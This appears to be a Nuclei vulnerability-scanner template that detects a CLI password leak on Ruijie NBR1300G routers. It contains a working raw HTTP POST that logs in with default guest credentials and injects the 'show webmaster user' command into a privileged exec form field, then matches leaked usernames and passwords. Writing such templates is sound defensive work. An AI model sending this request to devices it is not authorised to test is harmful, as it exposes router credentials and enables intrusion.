id: ruijie-nbr1300g-cli-password-leak
info:
  name: Ruijie NBR1300G CLI Password Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak
  description: |
    Detects a potential password leak issue in Ruijie NBR1300G devices when executing a POST request to /WEB_VMS/LEVEL15/ with specific payload and headers.
http:
  - raw:
      - |
        POST /WEB_VMS/LEVEL15/ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
        Content-Type: application/x-www-form-urlencoded

        command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "webmaster level 2 username guest"
          - "password guest"
        part: body
